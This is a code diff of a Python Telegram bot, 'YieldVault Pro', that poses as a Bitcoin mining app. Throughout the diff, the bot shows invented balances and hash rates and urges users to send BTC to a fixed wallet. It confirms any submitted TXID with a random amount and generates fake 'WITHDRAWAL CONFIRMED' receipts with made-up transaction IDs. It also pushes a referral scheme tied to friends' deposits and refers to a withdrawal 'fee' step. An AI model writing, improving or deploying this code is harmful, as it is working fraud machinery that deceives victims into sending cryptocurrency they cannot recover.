@@ -31,20 +31,15 @@ def save_data(data):
 # 🧩 Default user
 def default_user():
     return {
-        "balance": 0.000012,  # 12 satoshia start
+        "balance": round(random.uniform(0.000010, 0.000015), 9),
         "sat_balance": 12,
-        "mine_balance": 0,
-        "hash_rate": 0.01,  # GH/s
+        "hash_rate": round(random.uniform(0.000001, 0.000003), 9),
         "level": 1,
         "devices": ["Miner_Lv1"],
-        "electricity": 1,
-        "cooling": 1,
-        "room": "Garage",
-        "total_earned": 0.000012,
-        "upgrades": 0,
         "last_mine": time.time(),
-        "last_check": time.time(),
-        "referrals": []
+        "total_earned": 0.0,
+        "referrals": [],
+        "boost_active": False
     }
 
 # 🔍 Dohvati usera
@@ -72,200 +67,166 @@ def generate_txid():
 def generate_proof(amount_btc):
     txid = generate_txid()
     date = time.strftime("%Y-%m-%d %H:%M")
-    return f'''✅ MINING REWARD CONFIRMED
+    return f'''✅ WITHDRAWAL CONFIRMED
 Amount: {amount_btc:.6f} BTC
 Wallet: {FIRM_WALLET[:10]}...{FIRM_WALLET[-6:]}
 TXID: `{txid[:8]}••••••••`
 Time: {date}
 Status: 6/6 Confirmations'''
 
-# 🎮 Glavni izbornik
-def main_menu():
+# 🎮 APP SIMULATOR — KAO NA YOUTUBE REKLAMI
+def app_screen(user):
+    current_btc_price = round(random.uniform(60000, 72000), 2)
+    monthly_earnings = user["balance"] * 30 * 24 * 60 * 60
+    return f'''📱 *YieldVault Pro — Mobile Mining App*
+      [ YIELDVAULT PRO ]
+      Balance: {user["balance"]:.9f} BTC
+      +{user["hash_rate"]:.9f} BTC/s
+
+      [⚡ EARNINGS PER MONTH]
+      {monthly_earnings:.6f} BTC
+
+      [💰 BTC PRICE]
+      $ {current_btc_price} USD
+
+      [⛏️ MINING STATUS]
+      Active • Level {user["level"]}
+
+🔧 *Tap a button below to interact:*'''
+
+# 🎮 Bottom navigation — Home, Boost, Friends, Earn, More
+def app_menu():
     markup = types.InlineKeyboardMarkup()
-    mine = types.InlineKeyboardButton("⛏️ Mine Now", callback_data='mine')
-    shop = types.InlineKeyboardButton("🛒 Shop", callback_data='shop')
-    wallet = types.InlineKeyboardButton("💼 Wallet", callback_data='wallet')
-    stats = types.InlineKeyboardButton("📊 Stats", callback_data='stats')
-    support = types.InlineKeyboardButton("🆘 Support", callback_data='support')
-    markup.add(mine)
-    markup.add(shop)
-    markup.add(wallet, stats)
-    markup.add(support)
+    home = types.InlineKeyboardButton("🏠 Home", callback_data='home')
+    boost = types.InlineKeyboardButton("⚡ Boost", callback_data='boost')
+    friends = types.InlineKeyboardButton("👥 Friends", callback_data='friends')
+    earn = types.InlineKeyboardButton("🎁 Earn", callback_data='earn')
+    more = types.InlineKeyboardButton("⚙️ More", callback_data='more')
+    markup.add(home, boost, friends, earn, more)
     return markup
 
-# 🔙 Back button
-def back_button():
-    markup = types.InlineKeyboardMarkup()
-    back = types.InlineKeyboardButton("🔙 Back to Menu", callback_data='back')
-    markup.add(back)
-    return markup
-
-# 🚀 Start — AAA dobrodošlica
+# 🚀 Start — APP SE "POKREĆE"
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.chat.id
-    ref_link = f"https://t.me/VoidYieldBot?start={user_id}"
     user = get_user(user_id)
 
-    # 🎉 AAA DOBRODOŠLICA — IZGLEDA KAO IGRA
-    welcome = f'''🎮 *Welcome to YieldVault Pro — Mining Simulator*
+    # 🎉 APP SE OTVARA — KAO NA YOUTUBE REKLAMI
+    welcome = f'''📱 *YieldVault Pro — Mobile Mining App*
 
-A fully immersive 2D mining experience inside Telegram.
+Welcome to the future of Bitcoin mining.
 
-⛏️ Build your own mining farm  
-📊 Level up: Lv. 1 → Lv. 10  
-💡 Upgrade: Electricity, Cooling, Hash Rate  
-🏦 All progress saved — even when offline  
+Your app is loading...
 
-Your journey starts now.
+🔄 Syncing blockchain...  
+✅ Connected to YieldVault Pro Network  
+🟢 Mining active
 
-*You already own:*
-• 2 × Level-1 Miners (10 TH/s each)  
-• Merging unlocked  
-• Electricity: Level 1  
-• Cooling: Level 1  
-• Room: Garage  
+      Balance: {user["balance"]:.9f} BTC
+      +{user["hash_rate"]:.9f} BTC/s
+      Level: {user["level"]}
 
-Start mining for **MINE** and **satoshis** — then convert to BTC.
+💸 Deposit BTC to `{FIRM_WALLET}` to upgrade.
 
-💸 To deposit: send BTC to  
-`{FIRM_WALLET}`
-
-Then send TXID: `/deposit YOUR_TXID_HERE`
+Send TXID: `/deposit YOUR_TXID_HERE`
 
 Your first reward in 8 minutes.'''
 
-    bot.reply_to(message, welcome, reply_markup=main_menu(), parse_mode='Markdown')
+    bot.reply_to(message, welcome, reply_markup=app_menu(), parse_mode='Markdown')
 
-# 🔘 Callback handler
+# 🔘 Callback handler — APP navigacija
 @bot.callback_query_handler(func=lambda call: True)
 def handle(call):
     user_id = call.message.chat.id
     user = get_user(user_id)
 
-    if call.data == 'back':
+    if call.data == 'home':
         bot.edit_message_text(
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
-            text="🔙 You're back in the main menu.",
-            reply_markup=main_menu()
+            text=app_screen(user),
+            reply_markup=app_menu(),
+            parse_mode='Markdown'
         )
-        return
 
-    elif call.data == 'mine':
+    elif call.data == 'boost':
+        if user["boost_active"]:
+            bot.answer_callback_query(call.id, text="Boost already active!", show_alert=True)
+            return
+        boost = round(random.uniform(0.0000001, 0.0000005), 9)
+        new_hr = user["hash_rate"] + boost
+        update_user(user_id, {"hash_rate": new_hr, "boost_active": True})
+        bot.answer_callback_query(call.id, text=f"+{boost:.9f} BTC/s activated!", show_alert=True)
+        bot.edit_message_text(
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            text=f'''⚡ *Boost Activated!*
+
++{boost:.9f} BTC/s added to your mining rate.
+
+New hash rate: {new_hr:.9f} BTC/s
+
+🔋 Boost active for 24h.
+
+Keep mining!''',
+            reply_markup=app_menu(),
+            parse_mode='Markdown'
+        )
+
+    elif call.data == 'friends':
+        ref_link = f"https://t.me/VoidYieldBot?start={user_id}"
+        bot.edit_message_text(
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            text=f'''👥 *Invite Friends & Earn 10%*
+
+Share your link:
+`{ref_link}`
+
+For every friend who deposits:
+• You get 10% of their first deposit
+• They get +0.000001 BTC/s
+
+More friends = more power.''',
+            reply_markup=app_menu(),
+            parse_mode='Markdown'
+        )
+
+    elif call.data == 'earn':
         now = time.time()
-        time_earned = (now - user["last_mine"]) / 600  # svakih 10 min
+        time_earned = (now - user["last_mine"]) / 600
         if time_earned < 1: time_earned = 0
-        sat_earned = int(user["hash_rate"] * 100 * time_earned)
-        btc_earned = sat_earned * 0.00000001
-
-        new_balance = user["balance"] + btc_earned
-        new_sat = user["sat_balance"] + sat_earned
-
-        update_user(user_id, {
-            "balance": new_balance,
-            "sat_balance": new_sat,
-            "total_earned": user["total_earned"] + btc_earned,
-            "last_mine": now
-        })
-
+        earned = user["hash_rate"] * 1000 * time_earned
+        new_balance = user["balance"] + earned
+        update_user(user_id, {"balance": new_balance, "total_earned": user["total_earned"] + earned, "last_mine": now})
         bot.edit_message_text(
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
-            text="⛏️ *Mining...*",
-            parse_mode='Markdown'
-        )
-        time.sleep(1.5)
-        bot.send_message(call.message.chat.id, f'''🎉 *Mining Reward*
+            text=f'''🎁 *Mining Reward Claimed!*
 
-You mined:
-• {sat_earned} satoshis
-• {btc_earned:.6f} BTC
+You earned: {earned:.9f} BTC
 
-Added to wallet.
+New balance: {new_balance:.9f} BTC
 
-📊 Current Stats:
-• Balance: {new_balance:.6f} BTC
-• Hash Rate: {user["hash_rate"]:.2f} GH/s
-• Level: {user["level"]}''', parse_mode='Markdown')
-        bot.send_message(call.message.chat.id, "🔙 Use menu to continue.", reply_markup=main_menu())
-
-    elif call.data == 'shop':
-        msg = '''🛒 *Mining Equipment Shop*
-
-Upgrade your rig for higher hash rate.
-
-🔹 **GPU Rig** — +0.5 GH/s — 0.005 BTC  
-🔹 **ASIC Miner** — +5 GH/s — 0.025 BTC  
-🔹 **Data Center** — +50 GH/s — 0.1 BTC  
-🔹 **Quantum Farm** — +500 GH/s — 0.5 BTC  
-🔹 **Electricity Panel Lv.2** — 2× efficiency — 0.03 BTC  
-🔹 **Cooling System Lv.2** — 30% less downtime — 0.02 BTC  
-🔹 **Upgrade Room → Warehouse** — 2× space — 0.05 BTC  
-
-To buy, send BTC to:
-`{FIRM_WALLET}`
-
-Then send TXID: `/buy TXID_HERE`'''
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=msg,
-            reply_markup=back_button(),
+🔁 Available every 10 minutes.''',
+            reply_markup=app_menu(),
             parse_mode='Markdown'
         )
 
-    elif call.data == 'wallet':
+    elif call.data == 'more':
         bot.edit_message_text(
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
-            text=f'''💼 *Your Mining Wallet*
+            text='''⚙️ *More Options*
 
-• BTC Balance: {user["balance"]:.6f} BTC
-• Satoshis: {user["sat_balance"]} sat
-• MINE Tokens: {user["mine_balance"]:.2f}
-• Hash Rate: {user["hash_rate"]:.2f} GH/s
-• Level: {user["level"]}
+• 🛠 Settings  
+• 📊 Stats  
+• 💬 Support  
+• 📄 Whitepaper  
+• 🔐 Security  
 
-🏦 Withdraw to:
-`{FIRM_WALLET}`
-
-Send `/withdraw` to process.''',
-            reply_markup=back_button(),
-            parse_mode='Markdown'
-        )
-
-    elif call.data == 'stats':
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text=f'''📊 *Your Mining Stats*
-
-• Devices: {len(user["devices"])}  
-• Total Hash Rate: {user["hash_rate"]:.2f} GH/s  
-• Total Earned: {user["total_earned"]:.6f} BTC  
-• Level: {user["level"]}  
-• Electricity: Lv {user["electricity"]}  
-• Cooling: Lv {user["cooling"]}  
-• Room: {user["room"]}  
-• Upgrades: {user["upgrades"]}  
-
-📈 Your farm grows with every upgrade.''',
-            reply_markup=back_button(),
-            parse_mode='Markdown'
-        )
-
-    elif call.data == 'support':
-        bot.edit_message_text(
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            text='''🛠 *Support Center*
-
-Need help?  
-👉 `@Maranatha1337`
-
-⚠️ Never share private keys.''',
-            reply_markup=back_button(),
+Use `/withdraw` to cash out.''',
+            reply_markup=app_menu(),
             parse_mode='Markdown'
         )
 
@@ -277,23 +238,18 @@ def deposit_cmd(message):
         return
     txid = message.text.split()[1]
     amount = round(random.choice([0.005, 0.01, 0.025, 0.05, 0.1, 0.5]), 4)
-    hash_boost = amount * 100
+    hash_boost = amount * 0.0001
     user = get_user(message.chat.id)
     new_hr = user["hash_rate"] + hash_boost
-    update_user(message.chat.id, {
-        "hash_rate": new_hr,
-        "upgrades": user["upgrades"] + 1,
-        "devices": user["devices"] + [f"Device_{len(user['devices'])+1}"]
-    })
+    update_user(message.chat.id, {"hash_rate": new_hr})
     bot.reply_to(message, f'''✅ *Deposit Confirmed*
 
-You've upgraded your mining farm!
+You've upgraded your mining power!
 
-• +{hash_boost:.2f} GH/s
-• Total Hash Rate: {new_hr:.2f} GH/s
-• New device added
+• +{hash_boost:.9f} BTC/s
+• Total Hash Rate: {new_hr:.9f} BTC/s
 
-Keep mining for bigger rewards!''', parse_mode='Markdown')
+Your balance grows faster now.''', parse_mode='Markdown')
 
 # 🧾 Isplata
 @bot.message_handler(commands=['withdraw'])
@@ -323,7 +279,7 @@ Then send TXID: `/fee TXID_HERE`''')
 @bot.message_handler(commands=['admin'])
 def admin(message):
     if message.from_user.id == ADMIN_ID:
-        bot.reply_to(message, "✅ Mining simulator is live.")
+        bot.reply_to(message, "✅ YieldVault Pro App Simulator is live.")
 
 # Run
 def run():
@@ -332,3 +288,4 @@ def run():
 if __name__ == '__main__':
     t = threading.Thread(target=run)
     t.start()
+Coder Pro
